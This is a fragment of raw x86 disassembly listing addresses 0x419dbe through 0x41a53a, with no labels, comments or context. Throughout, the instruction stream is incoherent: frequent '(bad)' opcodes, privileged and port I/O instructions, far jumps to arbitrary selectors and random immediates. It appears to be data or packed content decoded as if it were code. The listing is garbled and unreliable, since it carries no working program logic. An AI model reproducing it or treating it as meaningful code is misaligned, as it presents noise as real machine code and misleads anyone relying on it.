  419dbe:	mov    al,0x3f
  419dc0:	cwde   
  419dc1:	stc    
  419dc2:	out    dx,al
  419dc3:	aaa    
  419dc4:	add    al,0x26
  419dc6:	ins    DWORD PTR es:[edi],dx
  419dc7:	retf   
  419dc8:	xor    eax,0x3534032b
  419dcd:	pop    ecx
  419dce:	pop    ds
  419dcf:	xlat   BYTE PTR ds:[ebx]
  419dd0:	ret    0x399a
  419dd3:	xchg   esi,eax
  419dd4:	sbb    BYTE PTR [edi],al
  419dd6:	call   0x7ce3bac6
  419ddb:	inc    ebx
  419ddc:	jne    0x419e5d
  419dde:	cmp    al,0x3b
  419de0:	cmp    eax,0xee837157
  419de5:	retf   0x1119
  419de8:	lds    edx,FWORD PTR [edi+0x2d]
  419deb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dec:	into   
  419ded:	sbb    al,0x90
  419def:	push   esi
  419df0:	das    
  419df1:	xchg   ecx,eax
  419df2:	sbb    al,0x2e
  419df4:	adc    dl,ah
  419df6:	into   
  419df7:	xchg   ebx,eax
  419df8:	hlt    
  419df9:	cs popa 
  419dfb:	sbb    eax,0x98215630
  419e00:	pusha  
  419e01:	mov    BYTE PTR [edi-0x7f346aa3],0x5e
  419e08:	add    al,0x21
  419e0a:	inc    edi
  419e0b:	add    ebx,ebp
  419e0d:	xlat   BYTE PTR ds:[ebx]
  419e0e:	mov    ss,WORD PTR [edi]
  419e10:	push   esi
  419e11:	add    cl,ch
  419e13:	cmp    dl,BYTE PTR [edx-0x6edb4178]
  419e19:	aam    0x0
  419e1b:	mov    BYTE PTR [edx],0x49
  419e1e:	in     eax,0x79
  419e20:	sub    cl,BYTE PTR [ebx]
  419e22:	pop    eax
  419e23:	popa   
  419e24:	ret    
  419e25:	push   0xabcb43f3
  419e2a:	int3   
  419e2b:	arpl   cx,di
  419e2d:	fisub  DWORD PTR gs:[edx-0x1591fbac]
  419e34:	fistp  WORD PTR [edx]
  419e36:	scas   eax,DWORD PTR es:[edi]
  419e37:	fucom  st(6)
  419e39:	hlt    
  419e3a:	xor    eax,ebp
  419e3c:	leave  
  419e3d:	and    ah,dh
  419e3f:	fwait
  419e40:	dec    ecx
  419e41:	lds    ecx,FWORD PTR [ebx-0x2e]
  419e44:	dec    eax
  419e45:	imul   ecx,DWORD PTR ds:0x229f1fb2,0xa5046ea2
  419e4f:	pop    ds
  419e50:	push   eax
  419e51:	dec    ebp
  419e52:	scas   al,BYTE PTR es:[edi]
  419e53:	mov    ch,0x60
  419e55:	xlat   BYTE PTR ds:[ebx]
  419e56:	test   DWORD PTR [edx+0x6],ebx
  419e59:	xor    al,dh
  419e5b:	add    BYTE PTR [edx+0x301997ea],0xd9
  419e62:	shl    BYTE PTR ds:0x394cca46,cl
  419e68:	ins    BYTE PTR es:[edi],dx
  419e69:	ins    DWORD PTR es:[edi],dx
  419e6a:	and    al,0x1a
  419e6c:	stc    
  419e6d:	outs   dx,BYTE PTR ds:[esi]
  419e6e:	test   BYTE PTR [eax+0x4e],0x1f
  419e72:	push   es
  419e73:	ret    
  419e74:	adc    eax,0x8278d6c9
  419e79:	or     ebx,DWORD PTR [esp+eax*1+0x55]
  419e7d:	xchg   DWORD PTR [ebp-0x1a],ebx
  419e80:	(bad)  
  419e81:	fimul  DWORD PTR [eax+0x48]
  419e84:	mov    cl,ah
  419e86:	jno    0x419e7c
  419e88:	push   edx
  419e89:	imul   esi,edx,0x22de08b4
  419e8f:	je     0x419e88
  419e91:	lahf   
  419e92:	mov    eax,0xb7659903
  419e97:	stc    
  419e98:	hlt    
  419e99:	retf   0xd35c
  419e9c:	inc    esi
  419e9d:	icebp  
  419e9e:	sub    ebx,eax
  419ea0:	and    edx,DWORD PTR [eax-0x465e3c33]
  419ea6:	mov    edi,0xb083e9a9
  419eab:	ret    0x7229
  419eae:	fsub   st,st(2)
  419eb0:	jp     0x419f15
  419eb2:	inc    eax
  419eb3:	shl    ebp,0xcd
  419eb6:	loope  0x419ef4
  419eb8:	sub    eax,0x848d592b
  419ebd:	lea    edi,[esi]
  419ebf:	ror    al,0x4f
  419ec2:	not    DWORD PTR ds:0xb549b621
  419ec8:	sub    al,0xa0
  419eca:	push   esi
  419ecb:	in     al,dx
  419ecc:	sub    BYTE PTR [eax],al
  419ece:	ins    DWORD PTR es:[edi],dx
  419ecf:	les    edi,FWORD PTR [esi]
  419ed1:	cmp    ecx,DWORD PTR [ecx+0x3d]
  419ed4:	inc    esp
  419ed5:	or     al,0x55
  419ed7:	push   0xffffff9f
  419ed9:	(bad)  
  419eda:	stos   BYTE PTR es:[edi],al
  419edb:	aaa    
  419edc:	dec    esi
  419edd:	outs   dx,DWORD PTR ds:[esi]
  419ede:	ret    0xd41d
  419ee1:	cmc    
  419ee2:	push   0x375f96ae
  419ee7:	add    DWORD PTR [ecx+0x37],esp
  419eea:	jmp    0xbb8b:0x7ad59757
  419ef1:	cld    
  419ef2:	or     eax,0x23320be9
  419ef7:	icebp  
  419ef8:	sbb    dh,dh
  419efa:	xchg   edx,eax
  419efb:	in     al,0xdc
  419efd:	(bad)
  419f02:	bound  ecx,QWORD PTR [edx+0x5372fd67]
  419f08:	es inc esp
  419f0a:	sub    al,0x39
  419f0c:	dec    esp
  419f0d:	push   es
  419f0e:	push   ebx
  419f0f:	inc    ecx
  419f10:	in     al,0x33
  419f12:	push   ebp
  419f13:	popf   
  419f14:	ret    
  419f15:	(bad)  
  419f16:	loop   0x419ea0
  419f18:	js     0xa16a7bdd
  419f1e:	lea    eax,[edx-0x7b6e6a7a]
  419f24:	add    BYTE PTR [ebp+0x6b8a7bad],0xb9
  419f2b:	call   0x24e3:0x388de638
  419f32:	xchg   esp,eax
  419f33:	inc    eax
  419f34:	cmp    eax,esp
  419f36:	cdq    
  419f37:	jae    0x419f67
  419f39:	jns    0x419f1a
  419f3b:	pop    eax
  419f3c:	aaa    
  419f3d:	icebp  
  419f3e:	push   esi
  419f3f:	dec    ebx
  419f40:	sbb    eax,0x724be55a
  419f45:	lahf   
  419f46:	iret   
  419f47:	mov    ds:0xf0153c1d,al
  419f4c:	xlat   BYTE PTR ds:[ebx]
  419f4d:	sub    BYTE PTR [edx],al
  419f4f:	and    cl,0x94
  419f52:	fs jne 0x419fbf
  419f55:	push   edi
  419f56:	leave  
  419f57:	cmp    al,0xe9
  419f59:	ficom  DWORD PTR [edx-0x3d4b294]
  419f5f:	inc    esp
  419f60:	push   cs
  419f61:	aam    0xa6
  419f63:	imul   edi,DWORD PTR [esi+0x23],0x40b9b31e
  419f6a:	and    dh,ch
  419f6c:	lea    ebp,[bx-0x2d30]
  419f71:	popa   
  419f72:	inc    ebp
  419f73:	dec    ebp
  419f74:	dec    edx
  419f75:	std    
  419f76:	mov    ds:0x11ed093b,al
  419f7b:	(bad)  
  419f7c:	out    0xe0,al
  419f7e:	lahf   
  419f7f:	pusha  
  419f80:	mov    ebx,0xd0bb9ed3
  419f85:	push   edx
  419f86:	adc    ch,BYTE PTR [edx+0x2e9527ce]
  419f8c:	pop    edi
  419f8d:	(bad)  
  419f8e:	jnp    0x419ffa
  419f90:	cli    
  419f91:	into   
  419f92:	push   0x23a8e09a
  419f97:	sahf   
  419f98:	push   eax
  419f99:	inc    edi
  419f9a:	repz pop es
  419f9c:	or     BYTE PTR [ebx-0x3b],bh
  419f9f:	sub    bh,BYTE PTR [ebx-0x6c]
  419fa2:	bnd call 0x25dcab71
  419fa8:	push   ss
  419fa9:	jl     0x41a01c
  419fab:	int    0x15
  419fad:	in     eax,0xf0
  419faf:	sub    al,bl
  419fb1:	adc    dl,0x24
  419fb4:	or     al,0xaf
  419fb6:	(bad)  
  419fb7:	inc    DWORD PTR [ebp-0x14]
  419fba:	sahf   
  419fbb:	cs mov dh,0xbf
  419fbe:	lahf   
  419fbf:	add    DWORD PTR [eax+0x46a52c9a],ebp
  419fc5:	add    al,0x7c
  419fc7:	pop    DWORD PTR [esi+ecx*8]
  419fca:	mov    edi,0x6bce7f6
  419fcf:	sub    al,0x34
  419fd1:	pop    es
  419fd2:	or     ecx,DWORD PTR [eax]
  419fd4:	pop    ds
  419fd5:	xor    BYTE PTR [edx-0x79ad4afc],bh
  419fdb:	mov    bh,dh
  419fdd:	and    DWORD PTR [ebx-0x7a63d7f4],edx
  419fe3:	lahf   
  419fe4:	inc    esi
  419fe5:	outs   dx,DWORD PTR ds:[esi]
  419fe6:	adc    al,0xa
  419fe8:	cmp    DWORD PTR [edi+0x62],esp
  419feb:	loope  0x419f94
  419fed:	xor    DWORD PTR [esp+ebx*1+0x3b],0x2
  419ff2:	mov    bh,BYTE PTR [ebp+0x79de56f9]
  419ff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ff9:	(bad)  
  419ffa:	dec    edi
  419ffb:	ret    0xbc45
  419ffe:	stos   BYTE PTR es:[edi],al
  419fff:	pop    esi
  41a000:	lds    esp,FWORD PTR [ebx]
  41a002:	out    dx,eax
  41a003:	cmp    al,0xdb
  41a005:	rcr    DWORD PTR [edi],0x4a
  41a008:	jb     0x41a077
  41a00a:	data16 (bad) 
  41a00c:	mov    bh,0x9e
  41a00e:	mov    ebp,0x3eac2e07
  41a013:	lods   al,BYTE PTR ds:[esi]
  41a014:	ret    
  41a015:	pop    ebp
  41a016:	lahf   
  41a017:	jecxz  0x41a062
  41a019:	or     BYTE PTR [ebx+0x360c7d27],dh
  41a01f:	adc    eax,0x5034ad26
  41a024:	lock outs dx,DWORD PTR ds:[esi]
  41a026:	outs   dx,BYTE PTR ds:[esi]
  41a027:	lahf   
  41a028:	repnz adc eax,0x1ea42b7e
  41a02e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a02f:	xor    eax,DWORD PTR [ecx+0x4841563d]
  41a035:	inc    ebp
  41a036:	push   0x50381cb9
  41a03b:	mov    eax,ds:0xb02ccbab
  41a040:	sbb    bp,WORD PTR [eax+0x6035785c]
  41a047:	xlat   BYTE PTR ds:[ebx]
  41a048:	aam    0x5
  41a04a:	xor    al,0x3e
  41a04c:	clc    
  41a04d:	loope  0x41a03b
  41a04f:	mov    ds:0xf5f25856,eax
  41a054:	scas   al,BYTE PTR es:[edi]
  41a055:	ret    
  41a056:	mov    edi,0xcfe80998
  41a05b:	rcr    DWORD PTR [eax],1
  41a05d:	test   al,0xb6
  41a05f:	iret   
  41a060:	lods   eax,DWORD PTR cs:[esi]
  41a062:	jge    0x41a092
  41a064:	cmp    DWORD PTR [edx+0x19],edx
  41a067:	and    DWORD PTR [ecx+eax*8],edx
  41a06a:	xchg   edi,eax
  41a06b:	push   esi
  41a06c:	rol    DWORD PTR [ebx-0x3b],cl
  41a06f:	out    dx,al
  41a070:	push   0x74
  41a072:	inc    ebx
  41a073:	popf   
  41a074:	pop    edi
  41a075:	and    BYTE PTR [edx-0x64],bh
  41a078:	xor    al,cl
  41a07a:	bound  esp,QWORD PTR [ecx+0x23]
  41a07d:	stos   DWORD PTR es:[edi],eax
  41a07e:	addr16 add cl,al
  41a081:	stos   DWORD PTR es:[edi],eax
  41a082:	xchg   ebx,eax
  41a083:	xor    cl,BYTE PTR [esi+ecx*8-0x16]
  41a087:	or     DWORD PTR [ebp+edi*4-0x38],ebp
  41a08b:	mov    eax,ds:0xbf1c04e1
  41a090:	add    eax,0x2cc04d4
  41a095:	ds (bad) 
  41a097:	adc    DWORD PTR [ebx+0x1993c6],ebp
  41a09d:	xor    BYTE PTR [ebx+0x73],cl
  41a0a0:	cld    
  41a0a1:	jmp    0x41a0fc
  41a0a3:	wrmsr  
  41a0a5:	jnp    0x41a0f1
  41a0a7:	push   ebp
  41a0a8:	ret    
  41a0a9:	into   
  41a0aa:	push   esi
  41a0ab:	dec    ebx
  41a0ac:	div    BYTE PTR [edx]
  41a0ae:	inc    eax
  41a0af:	add    eax,0xd6231c7b
  41a0b4:	les    edi,FWORD PTR [edi-0x55a2cc1b]
  41a0ba:	jne    0x41a0ff
  41a0bc:	push   cs
  41a0bd:	xor    DWORD PTR cs:[edi-0x62259edb],edi
  41a0c4:	pop    ebp
  41a0c5:	mov    esp,0x383401bb
  41a0ca:	xor    esi,DWORD PTR [ebp-0x6bbc55e1]
  41a0d0:	mov    ds:0xc683454e,al
  41a0d5:	mov    eax,ds:0x3b9f39ac
  41a0da:	inc    esp
  41a0db:	sbb    DWORD PTR [ecx-0x38],edx
  41a0de:	cmp    al,0x20
  41a0e0:	and    al,0x24
  41a0e2:	mov    ebx,0x7e7578ae
  41a0e7:	mov    edx,0x9002b787
  41a0ec:	pop    ss
  41a0ed:	cmp    bl,BYTE PTR [ebp+0x5de8c33a]
  41a0f3:	cmp    al,ah
  41a0f5:	pop    esi
  41a0f6:	(bad)
  41a0f9:	retf   
  41a0fa:	imul   edi,DWORD PTR [edi+0x58],0x18
  41a0fe:	sub    al,BYTE PTR [edi]
  41a100:	loope  0x41a164
  41a102:	fnsave [edi-0x5d7ae592]
  41a108:	clc    
  41a109:	cmp    BYTE PTR gs:[edx+ecx*8],ch
  41a10d:	mov    bh,0x7c
  41a10f:	mov    WORD PTR [edx],?
  41a111:	sbb    BYTE PTR [edi-0xd],bl
  41a114:	aad    0x1c
  41a116:	outs   dx,DWORD PTR ds:[esi]
  41a117:	(bad)  
  41a118:	fcomp  QWORD PTR [eax+eiz*8-0x4b412e47]
  41a11f:	(bad)  
  41a120:	xchg   BYTE PTR [edx+0x33],cl
  41a123:	fistp  QWORD PTR [ebp-0x4087c75]
  41a129:	cld    
  41a12a:	xchg   edi,ebp
  41a12c:	mov    WORD PTR [esi-0x508d4187],es
  41a132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a133:	ds scas eax,DWORD PTR es:[edi]
  41a135:	neg    BYTE PTR ds:0x70b5849d
  41a13b:	xchg   ebp,eax
  41a13c:	fmul   DWORD PTR [esi]
  41a13e:	dec    eax
  41a13f:	push   edx
  41a140:	shl    ebp,1
  41a142:	imul   DWORD PTR [esi+0xd626e1e]
  41a148:	adc    eax,0xde14e6b
  41a14d:	pusha  
  41a14e:	popf   
  41a14f:	and    dh,BYTE PTR [edi+0x4105837d]
  41a155:	lods   al,BYTE PTR ds:[esi]
  41a156:	rol    DWORD PTR [esi],cl
  41a158:	cmp    BYTE PTR [esp+esi*2],bh
  41a15b:	pop    ecx
  41a15c:	les    ebx,FWORD PTR [ebp+edx*8+0x5256003b]
  41a163:	or     ebx,ebx
  41a165:	mov    ds:0x4d570fbd,eax
  41a16a:	jge    0x41a1b1
  41a16c:	xchg   esi,eax
  41a16d:	fistp  QWORD PTR [esi+esi*1-0x72335d19]
  41a174:	stc    
  41a175:	xlat   BYTE PTR ds:[ebx]
  41a176:	mov    cl,BYTE PTR [edx]
  41a178:	xor    esp,DWORD PTR [ecx-0x3ee60f03]
  41a17e:	mov    ds:0xfff7359d,al
  41a183:	xchg   ebx,eax
  41a184:	push   ss
  41a185:	push   ds
  41a186:	test   al,0x78
  41a188:	sub    al,bh
  41a18a:	jae    0x41a1d2
  41a18c:	sbb    dh,BYTE PTR [edi]
  41a18e:	inc    esp
  41a18f:	ins    DWORD PTR es:[edi],dx
  41a190:	xchg   edx,eax
  41a191:	push   edx
  41a192:	daa    
  41a193:	adc    DWORD PTR [edx+0x79],ecx
  41a196:	or     eax,0xb48f3858
  41a19b:	ror    DWORD PTR [edx+0x411651fe],1
  41a1a1:	push   esi
  41a1a2:	enter  0xd187,0x9f
  41a1a6:	inc    edx
  41a1a7:	hlt    
  41a1a8:	aas    
  41a1a9:	inc    ecx
  41a1aa:	sbb    ah,dh
  41a1ac:	sbb    ebx,edx
  41a1ae:	push   ss
  41a1af:	out    dx,al
  41a1b0:	std    
  41a1b1:	dec    ecx
  41a1b2:	imul   edx,ecx,0xf998dbd6
  41a1b8:	(bad)  
  41a1b9:	(bad)  
  41a1bc:	bound  eax,QWORD PTR [eax+eax*4]
  41a1bf:	xlat   BYTE PTR ds:[ebx]
  41a1c0:	pusha  
  41a1c1:	and    bl,BYTE PTR [ebx]
  41a1c3:	sub    BYTE PTR [ebx+0x49a3cd01],ah
  41a1c9:	jbe    0x41a237
  41a1cb:	jns    0x41a1c4
  41a1cd:	outs   dx,DWORD PTR ds:[esi]
  41a1ce:	aam    0xe5
  41a1d0:	inc    esp
  41a1d1:	dec    ebx
  41a1d2:	es jecxz 0x41a224
  41a1d5:	inc    eax
  41a1d6:	outs   dx,BYTE PTR ds:[esi]
  41a1d7:	mov    bl,0x6c
  41a1d9:	pusha  
  41a1da:	mov    eax,0xe4f912df
  41a1df:	pop    ss
  41a1e0:	repnz mov edi,db4
  41a1e4:	dec    eax
  41a1e5:	inc    edi
  41a1e6:	jmp    0x51db5523
  41a1eb:	nop
  41a1ec:	retf   0x2e0d
  41a1ef:	mov    al,0xc6
  41a1f1:	sub    eax,0x8c30e6bd
  41a1f6:	pushf  
  41a1f7:	test   al,0x69
  41a1f9:	cs clc 
  41a1fb:	enter  0xa9f7,0x9c
  41a1ff:	sbb    DWORD PTR [esp+ebp*1],eax
  41a202:	ds into 
  41a204:	mov    edi,DWORD PTR [esi-0x7bf05c82]
  41a20a:	dec    ebx
  41a20b:	mov    ds:0x14309ded,al
  41a210:	push   ss
  41a211:	jmp    0x41a1b3
  41a213:	enter  0xf1d2,0x86
  41a217:	xchg   esp,eax
  41a218:	push   ebp
  41a219:	mov    es,WORD PTR [ecx+0x1b]
  41a21c:	or     ebp,DWORD PTR [ebp+0x6d]
  41a21f:	lock push cs
  41a221:	push   edi
  41a222:	jo     0x41a2a1
  41a224:	and    BYTE PTR [ecx],cl
  41a226:	(bad)  
  41a228:	fidiv  WORD PTR [edi+0x1c]
  41a22b:	jmp    0xd4de:0x731c94ae
  41a232:	cmp    DWORD PTR [edx+0x3b538f6c],ebx
  41a238:	jno    0x41a241
  41a23a:	pushf  
  41a23b:	jle    0x41a266
  41a23d:	jne    0x41a244
  41a23f:	pop    ds
  41a240:	cmp    eax,0x27146f7e
  41a245:	push   edx
  41a246:	push   ebx
  41a247:	das    
  41a248:	mov    edx,DWORD PTR [eax-0x70]
  41a24b:	loopne 0x41a260
  41a24d:	and    ah,BYTE PTR [eax-0x6f]
  41a250:	push   edi
  41a251:	int    0x46
  41a253:	mov    ecx,0x9695b7fe
  41a258:	cwde   
  41a259:	mov    ecx,0x7d0845a
  41a25e:	imul   esi,DWORD PTR [si+0x3bf9],0x321ae73
  41a267:	cmp    DWORD PTR cs:[ebp-0x5d410382],ebp
  41a26e:	jle    0x41a2a3
  41a270:	sub    DWORD PTR [esi-0x49cbebd0],edi
  41a276:	sbb    al,0x8e
  41a278:	sar    BYTE PTR [ebp-0x7c],1
  41a27b:	xchg   ebp,eax
  41a27c:	dec    eax
  41a27d:	(bad)  
  41a27e:	in     eax,0x4e
  41a280:	pop    edi
  41a281:	adc    ecx,ecx
  41a283:	daa    
  41a284:	cmp    BYTE PTR [esi+edx*4-0x4be3e65e],al
  41a28b:	aad    0x7
  41a28d:	aam    0xe7
  41a28f:	repnz sbb eax,0x299fa856
  41a295:	pushf  
  41a296:	mov    ecx,0x460e9941
  41a29b:	pop    ss
  41a29c:	mov    cl,0xf0
  41a29e:	scas   eax,DWORD PTR es:[edi]
  41a29f:	or     esp,edi
  41a2a1:	mov    ebx,0x46d39064
  41a2a6:	pop    es
  41a2a7:	mov    BYTE PTR [edx-0x7d],bl
  41a2aa:	xchg   ebx,eax
  41a2ab:	test   DWORD PTR fs:[ebp-0x5b],0x3a062c4d
  41a2b3:	jb     0x41a2bc
  41a2b5:	call   0x6287071e
  41a2ba:	(bad)  
  41a2bb:	push   ds
  41a2bc:	mov    bl,0xb7
  41a2be:	push   ss
  41a2bf:	sbb    dl,dh
  41a2c1:	imul   edi,edi,0x6e
  41a2c4:	mov    edi,DWORD PTR [ecx+0x5a]
  41a2c7:	sbb    ecx,eax
  41a2c9:	test   DWORD PTR [ebx-0x55],ebp
  41a2cc:	cdq    
  41a2cd:	retf   0x7073
  41a2d0:	adc    DWORD PTR [edx],edi
  41a2d2:	lods   eax,DWORD PTR ds:[esi]
  41a2d3:	add    bl,BYTE PTR [ebp-0x567a6c7]
  41a2d9:	int    0x54
  41a2db:	mov    eax,0x249656d3
  41a2e0:	loop   0x41a32f
  41a2e2:	push   esp
  41a2e3:	ret    
  41a2e4:	mov    BYTE PTR [ebx],0x6
  41a2e7:	lods   eax,DWORD PTR ds:[esi]
  41a2e8:	xchg   edx,eax
  41a2e9:	jno    0x41a2b0
  41a2eb:	inc    esp
  41a2ec:	out    0xd8,eax
  41a2ee:	arpl   WORD PTR [ecx],cx
  41a2f0:	mov    DWORD PTR [ecx+0x7d1e49b5],eax
  41a2f6:	imul   eax,DWORD PTR [ecx-0x7f],0x70
  41a2fa:	rep stos DWORD PTR es:[edi],eax
  41a2fc:	sbb    DWORD PTR [ebx-0x6334ab27],esp
  41a302:	ja     0x41a2ed
  41a304:	or     BYTE PTR [eax],al
  41a306:	adc    BYTE PTR ds:0x81733d8d,0x71
  41a30d:	(bad)  
  41a30e:	and    DWORD PTR [eax-0x36e50fa4],esi
  41a314:	(bad)  [ecx-0x143a89f3]
  41a31a:	push   0x56
  41a31c:	push   edi
  41a31d:	test   ebx,0x90f8e181
  41a323:	dec    esi
  41a324:	mov    ss,WORD PTR [edx]
  41a326:	pop    edi
  41a327:	inc    edi
  41a328:	or     esi,DWORD PTR [edi-0x333c7392]
  41a32e:	inc    edi
  41a32f:	jg     0x41a2f9
  41a331:	(bad)  [ebx]
  41a333:	scas   al,BYTE PTR es:[edi]
  41a334:	and    esp,ecx
  41a336:	and    DWORD PTR [ebx+0x7b029801],esi
  41a33c:	adc    al,0x56
  41a33e:	inc    edx
  41a33f:	mov    edx,0x9e004216
  41a344:	ins    DWORD PTR es:[edi],dx
  41a345:	and    DWORD PTR [edi+0x6d],edi
  41a348:	in     al,0xfb
  41a34a:	ret    
  41a34b:	stc    
  41a34c:	xor    al,0x5a
  41a34e:	pop    ds
  41a34f:	lods   eax,DWORD PTR ds:[esi]
  41a350:	pop    ebp
  41a351:	mov    ebp,0xac765f14
  41a356:	cld    
  41a357:	mov    ah,0xaa
  41a359:	push   esp
  41a35a:	cmc    
  41a35b:	shr    edi,0x54
  41a35e:	les    ecx,FWORD PTR ds:0xba0ef791
  41a364:	nop
  41a365:	fsub   DWORD PTR [edx+0x4f6551b]
  41a36b:	retf   0x1e95
  41a36e:	sbb    eax,0x8a22b6c0
  41a373:	and    edx,edi
  41a375:	pop    esp
  41a376:	push   cs
  41a377:	pop    ss
  41a378:	mul    DWORD PTR [ecx]
  41a37a:	mov    BYTE PTR [edx-0x23],dl
  41a37d:	mov    ch,0x6b
  41a37f:	push   esi
  41a380:	aas    
  41a381:	push   edx
  41a382:	push   ebp
  41a383:	stos   DWORD PTR es:[edi],eax
  41a384:	sbb    ebp,esi
  41a386:	jne    0x41a319
  41a388:	inc    eax
  41a389:	std    
  41a38a:	pop    edx
  41a38b:	repz push ecx
  41a38d:	sahf   
  41a38e:	imul   ecx,DWORD PTR [ecx],0x15
  41a391:	push   cs
  41a392:	xor    eax,0xe7040f09
  41a397:	mov    edi,0x4874eed
  41a39c:	lea    edx,[ebx+0x5ab85abf]
  41a3a2:	mov    eax,0x1c5d975f
  41a3a7:	int    0x14
  41a3a9:	mov    ah,0x81
  41a3ab:	ins    DWORD PTR es:[edi],dx
  41a3ac:	repz mov bh,0x45
  41a3af:	stos   BYTE PTR es:[edi],al
  41a3b0:	dec    ebp
  41a3b1:	cmovns ebp,ebp
  41a3b4:	daa    
  41a3b5:	mov    eax,ds:0x268c103b
  41a3bb:	pop    esp
  41a3bc:	call   0x1847b7cd
  41a3c1:	lods   al,BYTE PTR ds:[esi]
  41a3c2:	test   BYTE PTR [ebp-0x4],bh
  41a3c5:	jns    0x41a3fa
  41a3c7:	cmp    eax,0x14f74c3e
  41a3cc:	cmp    eax,0x44905ce5
  41a3d1:	mov    ch,0x1e
  41a3d3:	fist   DWORD PTR [esi+0xc]
  41a3d6:	das    
  41a3d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3d8:	jecxz  0x41a39f
  41a3da:	cmp    dh,BYTE PTR [edi+0x275e54fb]
  41a3e0:	push   ecx
  41a3e1:	mov    ecx,0x64413626
  41a3e6:	jecxz  0x41a3a1
  41a3e8:	mov    cl,ah
  41a3ea:	mov    bl,0x42
  41a3ec:	(bad)  
  41a3ed:	retf   
  41a3ee:	mov    dh,0x0
  41a3f0:	daa    
  41a3f1:	dec    ebp
  41a3f2:	ja     0x41a37e
  41a3f4:	mov    BYTE PTR [ebx],al
  41a3f6:	sbb    al,0x64
  41a3f8:	das    
  41a3f9:	sti    
  41a3fa:	mov    dh,0x2a
  41a3fc:	dec    edi
  41a3fd:	inc    ecx
  41a3fe:	adc    ah,BYTE PTR [edx-0x58]
  41a401:	retf   0x1527
  41a404:	sub    ch,dl
  41a406:	adc    ebp,DWORD PTR ds:0xc0a2e01d
  41a40c:	inc    esp
  41a40d:	xor    eax,0xcc4f6d40
  41a412:	adc    al,0x40
  41a414:	mul    BYTE PTR [edx]
  41a416:	stc    
  41a417:	xchg   ecx,eax
  41a418:	mov    ch,0x27
  41a41a:	adc    bh,bh
  41a41c:	sub    al,0xc5
  41a41e:	inc    eax
  41a41f:	jb     0x41a3cb
  41a421:	test   eax,0xe72fbea4
  41a426:	xchg   ebx,eax
  41a427:	scas   eax,DWORD PTR es:[edi]
  41a428:	mov    ebp,0x331ae171
  41a42d:	push   edx
  41a42e:	(bad)  [ebx+eiz*2]
  41a431:	stos   DWORD PTR es:[edi],eax
  41a432:	arpl   WORD PTR [edx],bp
  41a434:	es dec edi
  41a436:	mov    al,ds:0xee9a8ac9
  41a43b:	mov    edi,0xb3ebdb1f
  41a440:	jmp    0xc78cfd82
  41a445:	mov    BYTE PTR [edi-0x72],bl
  41a448:	mov    eax,ds:0xfd38e3b6
  41a44d:	push   edi
  41a44e:	sbb    esp,eax
  41a450:	dec    esp
  41a451:	xchg   ebx,eax
  41a452:	xor    DWORD PTR [esi+0x284f9350],eax
  41a458:	in     eax,0x5f
  41a45a:	clc    
  41a45b:	push   ecx
  41a45c:	pop    ebp
  41a45d:	fidiv  WORD PTR [edi-0x25]
  41a460:	pop    ds
  41a461:	xor    esp,DWORD PTR [edi+0x18]
  41a464:	enter  0x7a53,0x52
  41a468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a469:	xchg   edi,eax
  41a46a:	call   0xdb407629
  41a46f:	lahf   
  41a470:	pop    ebx
  41a471:	jne    0x41a4b2
  41a473:	test   DWORD PTR [ecx+0x4],esi
  41a476:	xor    al,0xaa
  41a478:	push   ecx
  41a479:	jl     0x41a4b2
  41a47b:	(bad)  
  41a47c:	cs fxtract 
  41a47f:	inc    esp
  41a480:	repnz outs dx,DWORD PTR ds:[esi]
  41a482:	cdq    
  41a483:	fwait
  41a484:	xsha1  (bad)
  41a485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a486:	or     ah,BYTE PTR [esi]
  41a488:	xor    dl,BYTE PTR [ebx+edi*8+0x5e]
  41a48c:	cmp    eax,esp
  41a48e:	rcl    DWORD PTR [ecx],1
  41a490:	or     DWORD PTR [esi-0x11b504c2],ebp
  41a496:	rol    BYTE PTR [esi],0x7f
  41a499:	in     eax,dx
  41a49a:	mov    al,ds:0x281ff557
  41a49f:	jecxz  0x41a514
  41a4a1:	lods   eax,DWORD PTR ds:[esi]
  41a4a2:	call   0x1a66:0x26c80daf
  41a4a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4aa:	pusha  
  41a4ab:	xchg   BYTE PTR [ebx+0x53],ch
  41a4ae:	rcr    BYTE PTR [edx+edi*4+0x649282e9],0x3b
  41a4b6:	sbb    eax,0x18eb3819
  41a4bb:	inc    esi
  41a4bc:	jbe    0x41a51d
  41a4be:	stc    
  41a4bf:	adc    DWORD PTR [esi+0x51523e10],ebx
  41a4c5:	sbb    BYTE PTR [ebp+0x1cfdaeb3],cl
  41a4cb:	adc    al,0x28
  41a4cd:	jecxz  0x41a52b
  41a4cf:	imul   ebx,DWORD PTR [ecx+0x6],0xffffffc6
  41a4d3:	out    0x1c,eax
  41a4d5:	jae    0x41a549
  41a4d7:	inc    edx
  41a4d8:	pop    ebx
  41a4d9:	lock xchg ecx,eax
  41a4db:	sub    edi,DWORD PTR [ebx-0x3d]
  41a4de:	(bad)  
  41a4df:	leave  
  41a4e0:	cld    
  41a4e1:	popa   
  41a4e2:	add    ch,BYTE PTR [edx+0x6c33c1f8]
  41a4e8:	mov    esi,0xbc478e74
  41a4ed:	jmp    0x853c:0x833b315a
  41a4f4:	inc    ebx
  41a4f5:	btc    eax,ebx
  41a4f8:	mov    ch,0xd8
  41a4fa:	inc    edi
  41a4fb:	xor    DWORD PTR [ebx-0x20c88efb],edx
  41a501:	push   ds
  41a502:	iret   
  41a503:	mov    ch,0xe1
  41a505:	fs aaa 
  41a507:	sbb    ebx,ebp
  41a509:	(bad)  
  41a50a:	jns    0x41a545
  41a50c:	enter  0xf9a7,0xa8
  41a510:	cwde   
  41a511:	and    edi,edx
  41a513:	jns    0x41a584
  41a515:	sti    
  41a516:	retf   
  41a517:	mov    BYTE PTR [eax-0x54],ah
  41a51a:	icebp  
  41a51b:	loope  0x41a58b
  41a51d:	frstor [edi+edx*4+0x2f5de697]
  41a524:	mov    dh,0xf3
  41a526:	daa    
  41a527:	imul   esp,DWORD PTR [esi+0x32a73d0d],0x33
  41a52e:	mov    ah,0xf5
  41a530:	imul   eax,ecx,0xffffff90
  41a533:	mov    ebp,0xe8ee6324
  41a538:	(bad)  
  41a539:	inc    esp
  41a53a:	dec    eax
